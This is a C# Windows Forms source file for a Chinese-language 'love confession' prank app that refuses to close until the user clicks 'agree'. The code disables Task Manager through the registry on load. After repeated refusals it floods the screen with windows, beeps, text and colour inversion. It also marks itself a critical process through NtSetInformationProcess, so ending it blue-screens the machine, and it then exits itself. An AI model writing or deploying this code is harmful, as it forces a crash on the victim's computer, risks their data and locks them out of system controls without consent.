
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;


namespace I_love_you
{
    public partial class Form1 : Form
    {
        private readonly List<string> mesgs = new List<string> { "你太过分了！！！",
            "你居然不同意我的表白？可以",
            "我不能接受！",
            "你根本就不懂我的感受！",
            "你只关心你自己！",
            "看看你那被吓傻了的样子，哈哈",
            "家人们，谁懂啊，又是什么下头，真无语了",
            "我是谁我在哪我要干什么？"};
        private readonly List<Brush> colors = new List<Brush> { Brushes.Red, Brushes.Blue, Brushes.Green, Brushes.Yellow, Brushes.Purple,Brushes.Beige,Brushes.Crimson,Brushes.DarkTurquoise,Brushes.LightGoldenrodYellow,Brushes.Linen,Brushes.Tomato,Brushes.Wheat };
        private readonly List<FontStyle> fonts = new List<FontStyle> { FontStyle.Bold, FontStyle.Italic, FontStyle.Regular,FontStyle.Strikeout };

        //绘画引用
        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowDC(IntPtr hwnd);

        //蓝屏引用
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        int clicktimes = 0;
        int movetimes = 0;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_MouseMove(object sender, MouseEventArgs e)
        {
            this.label1.Location = new Point(e.X + 20, e.Y);
            label1.Text = "希望你能够认真选择";

            //this.label1.Text = "当前坐标：" + e.X + "," + e.Y;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //禁用资源管理器
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1, RegistryValueKind.DWord);
            //将label1显示在求顶层（其它空间之上
            label1.BringToFront();
            //设置label1背景为透明
            label1.BackColor = Color.Transparent;

            //设置鼠标指针图标
            Bitmap bmp = new Bitmap(Properties.Resources._1815573_cross_cancel_delete_icon__1_);
            Cursor cursor = new Cursor(bmp.GetHicon());
            label2.Cursor = cursor;

            Bitmap bmp2 = new Bitmap(Properties.Resources._8726173_smile_beam_icon);
            Cursor cursor2 = new Cursor(bmp2.GetHicon());
            this.Cursor = cursor2;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            MessageBox.Show("不能关闭哦亲爱的，要做出你的选择。","你坏坏");
            //取消closing发生
            e.Cancel = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //解除资源管理器禁用
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 0, RegistryValueKind.DWord);
            MessageBox.Show("么么哒，我就知道你对我有兴趣，来做朋友吧♂");
            timer1.Start();
        }

        private void button1_MouseMove(object sender, MouseEventArgs e)
        {
            //设置label1跟随鼠标的位置
            label1.Location = new Point(e.X + 20 + button1.Location.X, e.Y+button1.Location.Y);
            label1.Text = "对对，快点按下去啊！";
        }

        private void button2_MouseMove(object sender, MouseEventArgs e)
        {
            label1.Location = new Point(e.X + 20 + button2.Location.X, e.Y + button2.Location.Y);
            label1.Text = "要不再仔细考虑考虑？";
            if (movetimes < 4)
            {
                if (button2.Location.X == 548)
                {
                    //交换两个按钮位置
                    button2.Location = new Point(85, 301);
                    button1.Location = new Point(548, 301);
                    movetimes++;
                    return;
                }
                else
                {
                    //交换两个按钮位置
                    button2.Location = new Point(548, 301);
                    button1.Location = new Point(85, 301);
                    movetimes++;
                    return;
                }
            }

            if (movetimes < 25)
            {
                if (button2.Location.Y <= 301)
                {
                    button2.Location = new Point(button2.Location.X, button2.Location.Y + 80);
                    movetimes++;
                }
                else
                {
                    button2.Location = new Point(button2.Location.X, button2.Location.Y - 160);
                    movetimes++;
                }
            }
            else
            {
                button2.Location = new Point(548, 301);
            }

        }

        private void label2_MouseMove(object sender, MouseEventArgs e)
        {
            label1.Location = new Point(e.X + 20 + label2.Location.X, e.Y + label2.Location.Y);
            label1.Text = "希望你能够认真选择";
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            label1.Location = new Point(e.X + 20 + pictureBox1.Location.X, e.Y + pictureBox1.Location.Y);
            label1.Text = "这个不是我本人的样子哦";
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            if (clicktimes == 5)
            {
                MessageBox.Show("好玩吗？", "别点了");
            }
            clicktimes++;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            MessageBox.Show("请面对我的提议，求你了", "sorry");
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            //一点点设置透明，淡出关闭
            if (this.Opacity >= 0.025)
            {
                this.Opacity -= 0.025;
            }
            else
            {
                timer1.Stop();
                Environment.Exit(0);
            }
        }

        private void flowLayoutPanel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void flowLayoutPanel1_MouseMove(object sender, MouseEventArgs e)
        {
            label1.Location = new Point(e.X + 20 + flowLayoutPanel1.Location.X, e.Y + flowLayoutPanel1.Location.Y);
            label1.Text = "希望你能够认真选择";
        }

        private void button3_MouseMove(object sender, MouseEventArgs e)
        {
            label1.Location = new Point(e.X - 80 + button3.Location.X, e.Y + button3.Location.Y);
            label1.Text = "不要嘛";
        }

        private void button2_Click(object sender, EventArgs e)
        {
            movetimes++;
            if (movetimes <25)
            {
                MessageBox.Show("居然被你点到了，手速挺快啊，但是你还是得点同意");
                return;
            }
            if (movetimes == 26)
            {
                MessageBox.Show("求你了，你最好了");
            }
            else if (movetimes == 27)
            {
                MessageBox.Show("我每天下面给你吃，求你了");
            }
            else if (movetimes == 28)
            {
                MessageBox.Show("你想买什么都给你买");
            }
            else if (movetimes == 29)
            {
                MessageBox.Show("家务我包了");
            }
            else if (movetimes >= 30)
            {
                MessageBox.Show("快去点同意吧，么么哒");
            }

            if (movetimes > 50)
            {
                //点击50次以上就来点有意思的，蓝屏，弹窗

                //不断打开form2，窗口雪崩
                timer2.Start();

                //播放系统报错音效
                timer3.Start();

                //弹幕攻击
                Thread thread = new Thread(threadform);
                thread.Start();

                //运行反色
                Thread thread2 = new Thread(threadfanse);
                thread2.Start();

                //在鼠标位置画叉
                Thread thread3 = new Thread(threadicon);
                thread3.Start();

                button1.Visible = false;
                button2.Visible = false;


                int isCritical = 1;  // we want this to be a Critical Process
                int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

                Process.EnterDebugMode();  //acquire Debug Privileges

                // setting the BreakOnTermination = 1 for the current process
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

                //此时结束进程将会蓝屏

                //修改图框的图片
                pictureBox1.Image = Properties.Resources.v2_122115abe696caf86a6d6ece227e31a6_hd;
            }
        }


        private void threadform()
        {
            //弹幕攻击
            Random random = new Random();
            var screenh = Screen.PrimaryScreen.WorkingArea; // 获得屏幕大小
            var screen = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()));
            while (true)
            {
                Point point = new Point(random.Next(screenh.Width), random.Next(screenh.Height));//随机取坐标

                string mesg = mesgs[random.Next(mesgs.Count())];
                var font = fonts[random.Next(fonts.Count())];
                var color = colors[random.Next(colors.Count())];

                Thread.Sleep(500);
                
                //绘制文字图案在屏幕上
                screen.DrawString(mesg, Font, color, point);
            }
        }

        private void pictureBox2_MouseMove(object sender, MouseEventArgs e)
        {
            label1.Location = new Point(e.X + 20 + pictureBox2.Location.X, e.Y + pictureBox2.Location.Y);
        }

        private void Timer2_Tick(object sender, EventArgs e)
        {
            //一下是吓人部分
            movetimes++;
            Form form = new Form2();
            form.Show();

            if(movetimes == 180)
            {
                //开始时空隧道
                Thread thread = new Thread(threadlong);
                thread.Start();
            }

            if (movetimes == 250)
            {
                try
                {
                    Environment.Exit(0);
                }
                catch(Exception ex)
                {
                    //强制结束进程
                    System.Diagnostics.Process tt = System.Diagnostics.Process.GetProcessById(System.Diagnostics.Process.GetCurrentProcess().Id);
                    tt.Kill();
                }
            }
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            //播放系统声音
            System.Media.SystemSounds.Beep.Play();
        }

        [DllImport("user32.dll")]
        public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
        [DllImport("gdi32.dll")]
        public static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, int rop);

        private void threadfanse()
        {
            //屏幕反色

            while (true)
            {
                if(movetimes == 180)
                {
                    break;
                }
                // 获取桌面窗口句柄  
                IntPtr desktop = GetDesktopWindow();
                // 获取桌面窗口的设备上下文 DC  
                IntPtr hdc = GetWindowDC(desktop);

                //获取屏幕大小
                Rectangle screenRect = Screen.PrimaryScreen.WorkingArea;


                // 反转屏幕颜色  
                BitBlt(hdc, 0, 0, screenRect.Right - screenRect.Left, screenRect.Bottom - screenRect.Top, hdc, 0, 0, 0x00330008);

                // 释放设备上下文 DC  
                ReleaseDC(desktop, hdc);

                //暂停这个线程0.5秒
                Thread.Sleep(500);
            }

        }

        private void threadicon()
        {

         
            //如果图片是bitmap类型的需要转换形式  bitmap to icon
            Bitmap bitmap = new Bitmap(Properties.Resources.icons8_cancel_48);            
            IntPtr iconHandle = bitmap.GetHicon();
            Icon icon = Icon.FromHandle(iconHandle);

            while (true)
            {
                //在鼠标位置画×

                // 获取桌面窗口句柄  
                var desktop = GetDesktopWindow();

                // 获取桌面窗口的设备上下文 DC  
                var hdc = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()));

                // 获取光标位置
                Point cursor = Control.MousePosition;

                // 在光标位置处画错误图标
                hdc.DrawIcon(icon, cursor.X - 10, cursor.Y - 10);
            }
        }

        private void threadlong()
        {
            //时空隧道线程

            // 初始化参数
            double sleepTime = 1000; // 休眠时间，单位：毫秒
            Screen screen = Screen.PrimaryScreen;
            Size screenSize = screen.WorkingArea.Size;
            Point startPoint = new Point(0, 0);

            // 创建位图和绘图对象
            Bitmap screenBitmap = new Bitmap(screenSize.Width, screenSize.Height);
            Graphics screenGraphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()));
            Graphics bitmapGraphics = Graphics.FromImage(screenBitmap);

            do
            {
                try
                {
                    // 每次循环都将休眠时间减少，最小为1毫秒
                    sleepTime -= 100;
                    if (sleepTime <= 0)
                    {
                        sleepTime = 200;
                    }

                    // 将屏幕截图绘制到位图上
                    bitmapGraphics.CopyFromScreen(startPoint, startPoint, screenSize);

                    // 缩放位图并将其显示为图标
                    int width = (int)(screenSize.Width * 0.9);
                    int height = (int)(screenSize.Height * 0.9);
                    int x = (int)(screenSize.Width * 0.05);
                    int y = (int)(screenSize.Height * 0.05);
                    IntPtr hIcon = screenBitmap.GetHicon();

                    //将处理好的绘制到屏幕上
                    screenGraphics.DrawIcon(Icon.FromHandle(hIcon), new Rectangle(x, y, width, height));

                    // 休眠指定时间
                    Thread.Sleep((int)sleepTime);

                    // 释放资源并重新创建位图和绘图对象
                    bitmapGraphics.Dispose();
                    screenBitmap.Dispose();
                    screenBitmap = new Bitmap(screenSize.Width, screenSize.Height);
                    bitmapGraphics = Graphics.FromImage(screenBitmap);
                }
                catch
                {
                    // 出现异常时，释放资源并等待10秒后重新开始循环
                    screenGraphics.Dispose();
                    bitmapGraphics.Dispose();
                    screenBitmap.Dispose();
                    Thread.Sleep(1000);
                }
            } while (true);
        }
            
        
    }
}
